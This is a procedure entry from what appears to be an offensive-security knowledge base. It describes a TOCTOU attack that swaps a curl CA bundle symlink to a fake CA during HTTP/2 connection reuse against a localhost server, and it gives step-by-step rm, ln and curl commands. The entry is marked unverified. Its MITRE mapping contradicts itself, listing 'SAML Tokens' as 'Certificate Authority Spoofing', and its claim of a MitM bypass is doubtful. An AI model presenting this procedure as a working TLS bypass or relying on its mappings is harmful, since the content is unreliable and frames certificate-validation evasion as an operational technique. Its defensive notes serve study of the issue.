---
tags:
  - toctou
  - ca-swap
  - http2-reuse
  - mitm
type: procedure
tools:
  - '[[tools/curl]]'
  - '[[tools/ln]]'
tactics:
  - '[[Defense Evasion]]'
commands:
  - '[[commands/sleep-timing-window]]'
  - '[[commands/rm-ca-symlink]]'
  - '[[commands/ln-symlink-fake-ca]]'
  - '[[commands/curl-http2-requests-with-cacert]]'
verified: false
platforms:
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[SAML Tokens]]'
  - '[[Adversary-in-the-Middle]]'
updated_at: '2025-12-14T17:24:19.124Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: f16425e5-ee5a-4fd7-b0b5-f0ea20afcb5c
validated: true
mitre_tactics:
  - '[[Defense Evasion]]'
mitre_techniques:
  - '[[SAML Tokens]]'
  - '[[Adversary-in-the-Middle]]'
---
# Execute-TOCTOU-CA-Swap-and-Curl-Requests

## Summary

This procedure executes the core TOCTOU attack by timing a CA bundle swap via symlink after curl's initial TLS handshake, allowing the second request to reuse the connection without re-validation, demonstrating MitM bypass.

## Description

A background process sleeps briefly to align with curl's handshake, then removes and recreates the symlink to fake_ca.crt. The foreground curl command forces HTTP/2 and connection reuse for two requests to the local server, validating the vulnerability as the second request succeeds despite the untrusted CA.

## Requirements

1. Compiled curl binary, server running on 8443, ca.crt symlink to legit_ca.crt
2. fake_ca.crt and legit_ca.crt available
3. Localhost access

## Defense

Defensive measures and detection strategies:

- Disable connection reuse in libcurl apps or force per-request validation
- Monitor file changes to CA bundles in real-time
- Use immutable CA stores or containerized trust anchors

## Objectives

1. Trigger race condition during connection reuse
2. Bypass TLS validation for subsequent streams
3. Compromise data integrity/confidentiality via MitM

## Instructions

### Step 1: Time the Swap

**Context**: Delay in background to create window after handshake.

**Command** ([[commands/sleep-timing-window]]):
```bash
sleep 0.5
```

> Pauses 0.5 seconds.

### Step 2: Remove Old Symlink

**Context**: Clear existing ca.crt link.

**Command** ([[commands/rm-ca-symlink]]):
```bash
rm -f ca.crt
```

> Forces removal without prompt.

### Step 3: Create Fake Symlink

**Context**: Point ca.crt to fake CA post-validation.

**Command** ([[commands/ln-symlink-fake-ca]]):
```bash
ln -s fake_ca.crt ca.crt
```

> Creates new symbolic link.

### Step 4: Run Curl Requests

**Context**: Execute two requests over HTTP/2 with reuse.

**Command** ([[commands/curl-http2-requests-with-cacert]]):
```bash
./src/curl --http2 -v --cacert ca.crt https://localhost:8443/secure/data1 --cacert ca.crt https://localhost:8443/secure/data2
```

> Verbose output shows reuse; both succeed without errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion]] Defense Evasion

### Techniques

- [[SAML Tokens]] Certificate Authority Spoofing
- [[Adversary-in-the-Middle]] Adversary-in-the-Middle

### Sub-Techniques


## Commands Used

- [[commands/sleep-timing-window]]
- [[commands/rm-ca-symlink]]
- [[commands/ln-symlink-fake-ca]]
- [[commands/curl-http2-requests-with-cacert]]

## Tools Used

- [[tools/curl]]
- [[tools/ln]]

## Tags

- toctou
- ca-swap
- http2-reuse
- mitm
